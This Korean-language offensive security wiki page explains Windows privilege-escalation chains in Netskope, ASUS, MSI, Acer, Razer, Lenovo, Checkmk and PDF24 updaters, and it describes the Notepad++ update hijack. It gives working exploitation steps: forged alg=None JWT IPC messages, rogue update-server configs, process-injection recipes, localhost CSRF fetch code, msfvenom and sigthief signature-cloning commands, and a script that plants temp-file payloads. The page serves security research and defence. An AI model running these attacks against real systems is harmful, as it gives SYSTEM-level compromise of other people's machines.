# 엔터프라이즈 자동 업데이트 프로그램과 권한 있는 IPC 악용 (예: Netskope, ASUS 및 MSI)

{{#include ../../banners/hacktricks-training.md}}

이 페이지에서는 엔터프라이즈 엔드포인트 에이전트와 업데이트 프로그램에서 발견된 Windows 로컬 권한 상승 체인 유형을 일반화합니다. 이러한 프로그램은 손쉽게 접근할 수 있는 IPC 인터페이스와 권한이 높은 업데이트 절차를 제공합니다. 대표적인 예로 Netskope Client for Windows < R129 (CVE-2025-0309)이 있습니다. 낮은 권한의 사용자가 등록 요청을 공격자가 제어하는 서버로 유도한 다음, SYSTEM 서비스가 설치하는 악성 MSI를 전달할 수 있습니다.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

유사한 제품에서 재사용할 수 있는 핵심 아이디어:
- 권한이 높은 서비스의 localhost IPC를 악용해 재등록 또는 재구성을 공격자 서버로 유도합니다.
- 벤더의 업데이트 엔드포인트를 구현하고, 악성 “서명된” 패키지를 제공하도록 위조 Trusted Root CA를 전달한 뒤 업데이트 프로그램의 대상을 바꿉니다.
- 취약한 signer 검사(CN allow-list), 선택적 digest 플래그, 허술한 MSI 속성 검사를 우회합니다.
- IPC가 “암호화”되어 있다면, 레지스트리에 저장된 전역 읽기 가능 머신 식별자에서 key/IV를 도출합니다.
- 서비스가 호출자를 이미지 경로/프로세스 이름으로 제한하는 경우, allow-list에 있는 프로세스에 inject하거나 해당 프로세스를 suspended 상태로 생성한 다음 최소한의 thread-context 패치로 DLL을 bootstrap합니다.

사용자 지정 로컬 TCP 서비스는 PIN이나 다른 애플리케이션 자격 증명을 요구하더라도 동일한 방식으로 신원과 입력 경계를 검토해야 합니다. 리스너를 해당 프로세스 및 유효 서비스 계정과 연결한 다음, 실제 배포된 바이너리/버전을 확인하고 호출자가 제어하는 필드가 고정 버퍼에 복사되거나 자식 프로세스 명령을 구성하는 데 사용되기 전에 길이 검사가 이루어지는지 살펴보세요. [Microsoft의 buffer overrun 관련 지침](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns)은 권한이 높은 네이티브 코드에서 검증되지 않은 외부 입력이 위험한 이유를 설명합니다. loopback 리스너, 하드코딩된 자격 증명 또는 프로세스 이름만으로는 메모리 손상이나 SYSTEM 권한 실행이 입증되지 않습니다. 도달 가능성, 권한 부여, 코드 경로, 완화 조치는 여전히 별개의 조건입니다. 일반적인 열거는 수동적으로 수행하고, 실행 중인 서비스에 충돌을 유발할 길이의 입력을 보내지 마세요.

---
## 1) localhost IPC를 통해 등록 요청을 공격자 서버로 유도하기

많은 에이전트에는 localhost TCP를 통해 JSON을 사용해 SYSTEM 서비스와 통신하는 user-mode UI 프로세스가 포함되어 있습니다.

Netskope에서 관찰된 내용:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC 명령 ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

공격 흐름:
1) 백엔드 호스트(예: AddonUrl)를 제어하는 claim이 포함된 JWT 등록 토큰을 만듭니다. 서명이 필요하지 않도록 alg=None을 사용합니다.
2) JWT와 tenant 이름을 사용해 provisioning 명령을 호출하는 IPC 메시지를 보냅니다:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) 서비스가 enrollment/config를 위해 rogue server에 요청을 보내기 시작합니다. 예:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

참고:
- 호출자 검증이 path/name 기반이라면 allow-listed vendor binary에서 요청을 시작하세요(§4 참조).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) update channel hijacking으로 SYSTEM 권한으로 code 실행

client가 서버와 통신하면, 예상되는 endpoint를 구현하고 공격자가 제어하는 MSI로 유도하세요. 일반적인 순서는 다음과 같습니다.

1) /v2/config/org/clientconfig → 예를 들어, updater 간격이 매우 짧은 JSON config를 반환합니다:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate를 반환합니다. 서비스는 이를 Local Machine Trusted Root 저장소에 설치합니다.
3) /v2/checkupdate → 악성 MSI와 가짜 버전을 가리키는 metadata를 제공합니다.

실제 환경에서 흔히 발견되는 검사를 우회하는 방법:
- Signer CN allow-list: 서비스는 Subject CN이 “netSkope Inc” 또는 “Netskope, Inc.”와 같은지만 확인할 수 있습니다. rogue CA로 해당 CN을 가진 leaf를 발급하고 MSI에 서명할 수 있습니다.
- CERT_DIGEST property: CERT_DIGEST라는 무해한 MSI property를 포함합니다. 설치 시에는 이를 적용하지 않습니다.
- 선택적 digest enforcement: config flag(예: check_msi_digest=false)를 사용하면 추가적인 cryptographic validation이 비활성화됩니다.

결과: SYSTEM 서비스가
C:\ProgramData\Netskope\stAgent\data\*.msi
에서 MSI를 설치해 NT AUTHORITY\SYSTEM으로 임의 코드를 실행합니다.<sup>[[1]](#references)[[2]](#references)</sup>

패치 우회에서 얻을 교훈: 공급업체가 업데이트 출처를 cryptographically authenticate하는 대신 소수의 “신뢰할 수 있는” 도메인을 allow-list에 추가하는 방식으로 대응한다면, 여전히 트래픽을 유도할 수 있는 공급업체 소유 redirector나 reverse proxy를 찾아보세요. Netskope의 경우, 공개된 후속 연구에 따르면 R129 시기의 allow-list도 공격자가 제어하는 Azure App Service 콘텐츠를 proxy하는 `rproxy.goskope.com`을 통해 우회할 수 있었습니다. 호스트 이름 allow-list는 신뢰 경계가 아니라 장애물 정도로 취급하세요.<sup>[[14]](#references)</sup>

---
## 3) 암호화된 IPC 요청 위조 (존재하는 경우)

R127부터 Netskope는 IPC JSON을 Base64처럼 보이는 encryptData field로 감쌌습니다. 분석 결과, AES를 사용하며 key/IV는 모든 사용자가 읽을 수 있는 registry 값에서 파생되었습니다.
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

공격자는 암호화를 재현해 표준 사용자 권한으로 유효한 암호화 명령을 전송할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup> 일반적인 팁: agent가 갑자기 IPC를 “암호화”하기 시작하면 HKLM 아래의 device ID, product GUID, install ID를 key 재료로 사용하는지 확인하세요.

---
## 4) IPC 호출자 allow-list 우회 (경로/이름 검사)

일부 서비스는 TCP 연결의 PID를 확인한 뒤 이미지 경로/이름을 Program Files 아래에 있는 공급업체 바이너리의 allow-list와 비교해 peer를 인증하려 합니다(예: stagentui.exe, bwansvc.exe, epdlp.exe).

실용적인 우회 방법 두 가지:
- allow-list에 포함된 프로세스(예: nsdiag.exe)에 DLL injection을 수행하고 해당 프로세스 내부에서 IPC를 proxy합니다.
- allow-list에 포함된 바이너리를 일시 중단 상태로 실행한 다음 CreateRemoteThread 없이 proxy DLL을 bootstrap해 driver가 적용하는 tamper 규칙을 충족합니다(§5 참조).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper protection을 고려한 injection: 일시 중단 프로세스 + NtContinue 패치

제품에는 보호된 프로세스의 handle에서 위험한 권한을 제거하는 minifilter/OB callbacks driver(예: Stadrv)가 포함되는 경우가 많습니다.
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME를 제거합니다.
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE만 허용합니다.

이러한 제약을 준수하는 신뢰할 수 있는 user-mode loader:
1) CREATE_SUSPENDED를 지정해 공급업체 바이너리로 CreateProcess를 호출합니다.
2) 여전히 허용되는 handle을 가져옵니다. 프로세스에는 PROCESS_VM_WRITE | PROCESS_VM_OPERATION, thread에는 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT(또는 알려진 RIP에 코드를 패치하는 경우 THREAD_RESUME만)를 사용합니다.
3) ntdll!NtContinue(또는 초기에 매핑되는 것이 보장된 다른 thunk)를 DLL 경로에서 LoadLibraryW를 호출한 후 되돌아가는 작은 stub으로 덮어씁니다.
4) ResumeThread를 호출해 프로세스 내부에서 stub을 실행하고 DLL을 로드합니다.

이미 보호된 프로세스에 PROCESS_CREATE_THREAD 또는 PROCESS_SUSPEND_RESUME을 사용하지 않았기 때문에(프로세스를 직접 생성했으므로) driver의 정책을 준수합니다.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) 실용적인 도구
- NachoVPN (Netskope plugin)은 rogue CA, 악성 MSI 서명, 필요한 endpoint 제공을 자동화합니다: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope는 임의의 IPC 메시지(선택적으로 AES 암호화)를 구성하는 custom IPC client이며, allow-list에 포함된 바이너리에서 메시지를 보내기 위한 suspended-process injection도 포함합니다.<sup>[[4]](#references)</sup>

## 7) 알 수 없는 updater/IPC 표면을 빠르게 분류하는 작업 흐름

새로운 endpoint agent나 메인보드 “helper” suite를 분석할 때, 다음과 같은 빠른 작업 흐름만으로도 privesc 대상으로 유망한지 대체로 판단할 수 있습니다.<sup>[[6]](#references)</sup>

1) loopback listener를 열거하고 해당 listener를 공급업체 프로세스와 연결합니다:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) 후보 명명된 파이프 열거:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) 플러그인 기반 IPC 서버가 사용하는 레지스트리 기반 라우팅 데이터 조사:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) 먼저 user-mode client에서 endpoint 이름, JSON 키, command ID를 추출합니다. 패킹된 Electron/.NET 프런트엔드에서는 전체 스키마가 자주 leak됩니다:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) 결국 프로세스를 실행하는 code path만이 아니라 실제 trust predicate를 찾아보세요:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

우선순위를 둘 만한 패턴:
- `CryptQueryObject`/인증서 파싱은 하지만 보통 `WinVerifyTrust`를 사용하지 않는다면, “인증서가 존재한다”를 “인증서를 신뢰할 수 있다”로 취급했을 가능성이 큽니다. 이를 통해 인증서 복제나 다른 가짜 서명자 기법을 사용할 수 있습니다.
- `Origin`, `Referer`, 다운로드 URL, 프로세스 이름 또는 서명자 CN에 대한 부분 문자열/접미사 검사는 인증이 아닙니다. `contains(".vendor.com")`은 공격자가 제어하는 유사 도메인을 이용해 악용할 수 있는 경우가 많습니다.
- 낮은 권한의 GUI가 “파일을 신뢰할 수 있다”고 판단하고 SYSTEM broker가 그 결과를 그대로 사용한다면, 경계 전체를 우회하기 위해 클라이언트 측 DLL/JS를 패치하거나 재구현하는 것만으로 충분할 수 있습니다(Razer 방식의 검증 분리).
- broker가 payload를 `%TEMP%`/`C:\Windows\Temp`에 복사한 뒤 해당 경로에서 검증하거나 예약한다면, 먼저 TOCTOU 교체 가능 시간 구간과 더 약한 검사를 수행하는 대체 `ExecuteTask()` wrapper를 제공하는 형제 plugin 모듈이 있는지 확인하세요.<sup>[[6]](#references)</sup>

named pipe를 많이 사용하는 대상을 조사할 때는 프로토콜을 자세히 reverse하기 전에 PipeViewer로 약한 DACL과 원격에서 접근 가능한 pipe를 빠르게 찾을 수 있습니다.<sup>[[11]](#references)</sup>

대상이 PID, 이미지 경로 또는 프로세스 이름만으로 호출자를 인증한다면, 이를 경계가 아니라 통과해야 하는 장애물 정도로 보세요. 합법적인 클라이언트에 inject하거나 허용 목록에 있는 프로세스에서 연결하면 서버의 검사를 통과하기에 충분한 경우가 많습니다. named pipe의 경우 [클라이언트 impersonation 및 pipe 악용에 관한 이 페이지](named-pipe-client-impersonation.md)에서 해당 primitive를 자세히 다룹니다.

권한이 높은 **cleanup 또는 restore broker**의 경우 pipe ACL뿐 아니라 경로 신뢰 경계도 살펴보세요. 서비스 실행 파일과 설치 디렉터리가 보호되어 있어도, 권한이 낮은 호출자가 공유 디렉터리에서 restore 대상 경로를 선택하거나 준비된 백업 artifact의 이름을 변경할 수 있습니다. 호출자가 restore 명령에 접근할 수 있는지, 준비된 입력 파일 또는 파일명을 정확히 수정할 수 있는지, broker가 더 높은 권한으로 실행되는지, 그리고 restore 작업이 실제로 선택된 보호 경로에 쓰는지 각각 확인하세요. 쓰기 가능한 staging 디렉터리나 읽을 수 있는 pipe만으로는 임의의 권한 상승 쓰기가 입증되지 않습니다. 대상 경로 매핑과 서비스 동작은 코드 검토 또는 통제된 테스트가 필요합니다. 알 수 없는 cleanup 명령은 사용자 파일을 삭제할 수 있으므로 passive enumeration 중 실행하지 마세요.

---
## 8) 공급업체 서명만으로 인증되는 모듈식 add-in broker (Lenovo Vantage 패턴)

주목할 만한 새로운 변형은 **signed-client RPC broker**입니다. 권한이 낮은 Lenovo 서명 데스크톱 프로세스가 SYSTEM 서비스와 통신하고, 서비스는 JSON 명령을 `%ProgramData%` 아래의 XML 설명 add-in 집합으로 전달합니다. 허용된 서명 클라이언트 중 어디서든 code execution을 달성하면, 모든 `runas="system"` 계약이 공격 대상이 됩니다.<sup>[[15]](#references)</sup>

Lenovo Vantage 연구에서 관찰된 가치 높은 primitive:
- **공급업체 서명만으로 호출자를 신뢰**: 연구자들은 Lenovo 서명 EXE를 쓰기 가능한 디렉터리에 복사한 뒤 DLL side-load(`profapi.dll`)를 충족해, 서비스가 이미 신뢰하는 클라이언트 안에서 임의 코드가 실행되는 인증된 컨텍스트를 확보했습니다.
- **manifest 기반 공격 표면 탐색**: add-in은 `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 아래에 선언되어 있습니다. 여러 contract가 `SYSTEM`으로 실행되므로, manifest를 열거하면 broker 자체를 reverse하기보다 실제 권한 상승 동작을 더 빠르게 파악할 수 있습니다.
- **인증된 채널 뒤에 있는 명령별 취약점**: 신뢰된 클라이언트 안에 진입한 뒤, 공개된 연구에서는 update/install 동작의 path traversal + race condition, 권한이 높은 settings database의 raw-SQL 악용, 그리고 의도된 hive 바깥에 쓰기가 가능하게 하는 부분 문자열 기반 registry 경로 검사를 발견했습니다.

대상에서 유용한 recon:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

실무적인 요점: helper suite가 **caller process**를 먼저 인증한 다음 수십 개의 plugin/add-in 명령으로 디스패치하는 broker를 제공한다면, 앞단의 신뢰 검사를 우회하는 데서 멈추지 마세요. manifest/contract table을 덤프하고 각 고권한 verb를 개별적으로 fuzz하세요. 인증된 채널에는 보통 여러 2단계 버그가 숨겨져 있습니다.

---
## 1) 권한이 높은 HTTP API를 대상으로 한 브라우저-to-localhost CSRF (ASUS DriverHub)

DriverHub는 127.0.0.1:53000에서 사용자 모드 HTTP 서비스(ADU.exe)를 제공하며, 브라우저 요청의 출처가 https://driverhub.asus.com이라고 예상합니다. Origin 필터는 Origin 헤더와 `/asus/v1.0/*`가 노출하는 다운로드 URL에 대해 `string_contains(".asus.com")`만 수행합니다. 따라서 `https://driverhub.asus.com.attacker.tld` 같은 공격자 제어 호스트도 검사를 통과해 JavaScript에서 상태를 변경하는 요청을 보낼 수 있습니다.<sup>[[6]](#references)</sup> 추가 우회 패턴은 [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md)를 참고하세요.

실제 공격 흐름:
1) `.asus.com`을 포함하는 도메인을 등록하고, 그 도메인에서 악성 웹페이지를 호스팅합니다.
2) `fetch` 또는 XHR을 사용해 `http://127.0.0.1:53000`의 권한이 높은 엔드포인트(예: `Reboot`, `UpdateApp`)를 호출합니다.
3) 핸들러가 예상하는 JSON 본문을 전송합니다. 패킹된 frontend JS에서 아래 스키마를 확인할 수 있습니다.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

아래에 표시된 PowerShell CLI도 Origin 헤더를 신뢰된 값으로 위조하면 성공합니다:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

공격자 사이트를 브라우저로 방문하기만 해도 1-click (또는 `onload`를 통한 0-click) local CSRF가 발생해 SYSTEM helper를 구동합니다.

---
## 2) 안전하지 않은 code-signing 검증 및 certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp`은 JSON body에 지정된 임의의 실행 파일을 다운로드하고 `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`에 캐시합니다. 다운로드 URL 검증에도 동일한 부분 문자열 로직을 사용하므로 `http://updates.asus.com.attacker.tld:8000/payload.exe`가 허용됩니다. 다운로드 후 ADU.exe는 PE에 signature가 있고 Subject 문자열이 ASUS와 일치하는지만 확인한 뒤 실행합니다. `WinVerifyTrust`나 chain validation은 없습니다.

이 흐름을 weaponize하려면:
1) payload를 생성합니다 (예: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS signer를 payload에 복제합니다 (예: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `.asus.com`을 모방한 도메인에서 `pwn.exe`를 호스팅하고, 위의 브라우저 CSRF를 통해 UpdateApp을 트리거합니다.

Origin과 URL 필터가 모두 부분 문자열 기반이고 signer 검사가 문자열만 비교하므로, DriverHub는 공격자의 binary를 가져와 상승된 context에서 실행합니다.<sup>[[6]](#references)</sup>

---
## 1) updater의 복사/실행 경로에서 발생하는 TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center의 SYSTEM service는 각 frame이 `4-byte ComponentID || 8-byte CommandID || ASCII arguments` 형식인 TCP protocol을 노출합니다. 핵심 component (Component ID `0f 27 00 00`)에는 `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`가 포함되어 있습니다. 해당 handler는 다음 작업을 수행합니다.
1) 전달된 실행 파일을 `C:\Windows\Temp\MSI Center SDK.exe`에 복사합니다.
2) `CS_CommonAPI.EX_CA::Verify`를 통해 signature를 검증합니다 (certificate subject가 “MICRO-STAR INTERNATIONAL CO., LTD.”와 일치해야 하며 `WinVerifyTrust`가 성공해야 합니다).
3) 공격자가 제어하는 arguments를 사용해 temp file을 SYSTEM으로 실행하는 scheduled task를 생성합니다.

검증과 `ExecuteTask()` 실행 사이에 복사된 파일은 잠기지 않습니다. 공격자는 다음을 수행할 수 있습니다.
- 정상적인 MSI-signed binary를 가리키는 Frame A를 보냅니다 (signature 검사를 통과하고 task가 예약됩니다).
- 검증이 끝난 직후 `MSI Center SDK.exe`를 악성 payload로 덮어쓰는 Frame B 메시지를 반복적으로 보내 race를 유발합니다.

scheduler가 task를 실행하면 원본 파일의 검증 결과와 관계없이 덮어쓴 payload를 SYSTEM으로 실행합니다. 안정적인 exploitation을 위해 두 개의 goroutine/thread에서 CMD_AutoUpdateSDK를 반복 호출해 TOCTOU window를 차지합니다.<sup>[[6]](#references)</sup>

---
## 2) custom SYSTEM-level IPC 및 impersonation 악용 (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe`가 로드하는 각 plugin/DLL에는 `HKLM\SOFTWARE\MSI\MSI_CentralServer`에 저장된 Component ID가 할당됩니다. frame의 첫 4 bytes가 해당 component를 지정하므로 공격자는 임의의 module로 command를 보낼 수 있습니다.
- plugin은 자체 task runner를 정의할 수 있습니다. `Support\API_Support.dll`은 `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}`을 노출하며, **signature validation 없이** `API_Support.EX_Task::ExecuteTask()`를 직접 호출합니다. 로컬 사용자는 누구나 이를 `C:\Users\<user>\Desktop\payload.exe`로 지정해 확실하게 SYSTEM execution을 얻을 수 있습니다.
- Wireshark로 loopback을 스니핑하거나 dnSpy에서 .NET binary를 계측하면 Component ↔ command mapping을 빠르게 확인할 수 있습니다. 이후 custom Go/Python client로 frame을 재전송할 수 있습니다.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes 및 impersonation levels
- SYSTEM으로 실행되는 `ACCSvc.exe`는 `\\.\pipe\treadstone_service_LightMode`를 노출하며, discretionary ACL에서 원격 client (예: `\\TARGET\pipe\treadstone_service_LightMode`)를 허용합니다. command ID `7`과 함께 file path를 보내면 service의 process-spawning routine이 호출됩니다.
- client library는 args와 함께 magic terminator byte (113)를 serialize합니다. Frida/`TsDotNetLib`를 통한 dynamic instrumentation ([Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)의 계측 팁 참고) 결과, native handler가 `CreateProcessAsUser`를 호출하기 전에 이 값을 `SECURITY_IMPERSONATION_LEVEL` 및 integrity SID로 변환하는 것을 확인할 수 있습니다.
- 113 (`0x71`)을 114 (`0x72`)로 바꾸면 full SYSTEM token을 유지하고 high-integrity SID (`S-1-16-12288`)를 설정하는 generic branch로 진입합니다. 따라서 생성된 binary는 로컬 및 cross-machine 환경에서 모두 제한 없는 SYSTEM으로 실행됩니다.
- 이를 노출된 installer flag (`Setup.exe -nocheck`)와 결합하면 lab VM에서도 ACC를 설치하고 vendor hardware 없이 pipe를 테스트할 수 있습니다.<sup>[[6]](#references)</sup>

이러한 IPC bug는 localhost service가 mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering)을 적용해야 하는 이유와 각 module의 “임의의 binary 실행” helper가 동일한 signer 검증을 공유해야 하는 이유를 보여줍니다.

---
## 3) 취약한 user-mode validation에 의존하는 COM/IPC “elevator” helper (Razer Synapse 4)

Razer Synapse 4는 이 계열에서 또 다른 유용한 pattern을 추가했습니다. 권한이 낮은 사용자가 COM helper에 `RzUtility.Elevator`를 통해 process를 실행하도록 요청할 수 있으며, 신뢰 여부 판단은 privileged boundary 내부에서 강력하게 적용되는 대신 user-mode DLL (`simple_service.dll`)에 위임됩니다.

관찰된 exploitation 경로:
- COM object `RzUtility.Elevator`를 instantiate합니다.
- `LaunchProcessNoWait(<path>, "", 1)`을 호출해 elevated launch를 요청합니다.
- 공개된 PoC에서는 요청을 보내기 전에 `simple_service.dll` 내부의 PE-signature gate를 patch out하여 공격자가 선택한 임의의 실행 파일을 실행할 수 있습니다.<sup>[[6]](#references)[[10]](#references)</sup>

최소 PowerShell 호출:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

일반적인 요점: “helper” 제품군을 리버싱할 때 localhost TCP나 named pipes만 확인하고 멈추지 마세요. `Elevator`, `Launcher`, `Updater`, `Utility` 같은 이름의 COM 클래스를 확인한 다음, 권한이 높은 서비스가 대상 바이너리 자체를 실제로 검증하는지, 아니면 패치 가능한 user-mode 클라이언트 DLL이 계산한 결과를 그저 신뢰하는지 확인하세요. 이 패턴은 Razer뿐 아니라 그 이상으로 일반화됩니다. 높은 권한의 broker가 낮은 권한 측에서 전달한 허용/거부 결정을 사용하는 분리형 설계라면 무엇이든 privesc 공격 표면이 될 수 있습니다.


---
## MSI 복구 중 예측 가능한 임시 스크립트 실행 (Checkmk Agent / CVE-2024-0670)

일부 Windows agent는 여전히 `C:\Windows\Temp`에 임시 `.cmd` 파일을 작성한 뒤 `SYSTEM` 권한으로 실행해 권한 작업을 수행합니다. 파일 이름을 예측할 수 있고 서비스가 기존 파일을 안전하게 다시 만들지 않는다면, 낮은 권한의 사용자가 향후 임시 파일을 **읽기 전용**으로 미리 만들 수 있습니다. 그러면 권한이 높은 프로세스는 자체 스크립트 대신 공격자가 제어하는 콘텐츠를 실행하게 됩니다.

취약한 Checkmk Agent 빌드에서 관찰된 내용:
- temp 패턴: `cmk_all_<PID>_1.cmd`
- 영향받는 브랜치: `2.0.0`, `2.1.0`, `2.2.0`
- 트리거: 캐시된 agent 패키지의 MSI **복구**<sup>[[8]](#references)[[9]](#references)</sup>

실제 작업 흐름:
1. 현재 프로세스 ID 또는 실행 중인 agent PID를 바탕으로 현실적인 PID 범위를 추정합니다.
2. 짧은 **ASCII** `.cmd` payload를 작성합니다 (`Set-Content -Encoding Ascii` 또는 `cmd.exe` 리디렉션을 사용하고, 배치 파일에 UTF-16 PowerShell 출력을 사용하지 않습니다).
3. 후보 범위에 해당하는 `C:\Windows\Temp\cmk_all_<PID>_1.cmd` 파일을 대량으로 만들고 각 파일을 읽기 전용으로 설정합니다.
4. 캐시된 MSI의 복구를 트리거하여 권한이 높은 서비스가 임시 스크립트를 다시 생성한 뒤 실행하도록 합니다.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

취약한 제품이 Windows Installer로 설치되어 있다면, 복구를 트리거하기 전에 `C:\Windows\Installer` 아래의 무작위처럼 보이는 캐시된 MSI를 제품 이름에 대응시키세요:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operational notes:
- `qwinsta`은 비대화형 WinRM shell에서 `msiexec /fa`가 실패할 때 유용합니다. 기존 데스크톱/연결 끊김 세션에서 복구를 제대로 트리거할 수 있는지 파악하는 데 도움이 됩니다.<sup>[[7]](#references)</sup>
- 이 패턴은 **쓰기 권한이 모두에게 열린 위치에 임시 스크립트를 스테이징한 뒤 SYSTEM 권한으로 실행하는** 다른 endpoint agent 및 updater에도 적용됩니다. 예측 가능한 이름, exclusive create semantics의 부재, 그리고 필요할 때 트리거할 수 있는 repair/update 흐름이 있는지 테스트하세요.

### 대화형 installer 복구 및 권한이 높은 console

PDF24 Creator 11.15.1은 별도의 MSI-repair 위험을 보여줍니다. printer-install custom action이 복구 중 SYSTEM 권한으로 보이는 console을 시작할 수 있습니다. 공급업체는 이 동작을 해결하기 위해 11.15.2에서 MSI installer를 변경했습니다. 이전 제품 버전은 triage를 위한 단서일 뿐입니다. 등록되었거나 접근 가능한 MSI package, 이 사용자가 복구를 시작할 수 있는지, 취약한 custom action과 log-file 지연이 있는지, 대화형 desktop에서 console을 표시할 수 있는지 확인하세요. 보고된 지연에는 `faxPrnInst.log`에 대한 oplock이 사용되었습니다. 일반적인 파일 쓰기 권한만이 유일한 접근 조건은 아닙니다. 비대화형 shell, 접근할 수 없는 package 또는 패치된 installer는 공격 체인을 끊을 수 있습니다. 이 문제는 `AlwaysInstallElevated`에 의존하지 않으며, 예측 가능한 임시 스크립트를 교체하는 것과도 다릅니다.

---
## 취약한 updater 검증을 통한 원격 공급망 하이재킹 (WinGUp / Notepad++)

2025년 6월부터 2025년 12월까지, Notepad++ 업데이트 흐름의 호스팅 인프라를 침해한 공격자들은 특정 피해자에게 악성 manifest를 선택적으로 제공했습니다. 구형 WinGUp 기반 updater는 업데이트의 진위를 완전히 검증하지 않았으므로, 악성 XML 응답이 클라이언트를 공격자가 제어하는 URL로 리디렉션할 수 있었습니다. 클라이언트가 신뢰할 수 있는 certificate chain과 다운로드된 installer의 유효한 PE signature를 모두 확인하지 않고 HTTPS 콘텐츠를 받아들였기 때문에, 피해자들은 트로이목마화된 NSIS `update.exe`를 다운로드해 실행했습니다.<sup>[[12]](#references)[[13]](#references)</sup>

운영 흐름 (로컬 exploit 불필요):
1. **인프라 가로채기**: CDN/호스팅을 침해하고, 악성 다운로드 URL을 가리키는 공격자 메타데이터로 업데이트 확인 요청에 응답합니다.
2. **트로이목마화된 NSIS**: installer가 payload를 가져와 실행하고 두 가지 실행 체인을 악용합니다.
   - **Bring-your-own signed binary + sideload**: 서명된 Bitdefender `BluetoothService.exe`를 함께 제공하고 검색 경로에 악성 `log.dll`을 배치합니다. 서명된 binary가 실행되면 Windows가 `log.dll`을 sideload하고, 이 DLL은 Chrysalis backdoor를 복호화해 reflectively load합니다 (정적 탐지를 어렵게 하기 위해 Warbird로 보호하고 API hashing을 사용).
   - **스크립트 기반 shellcode injection**: NSIS가 Win32 API (예: `EnumWindowStationsW`)를 사용해 shellcode를 주입하고 Cobalt Strike Beacon을 스테이징하는 컴파일된 Lua script를 실행합니다.<sup>[[12]](#references)</sup>

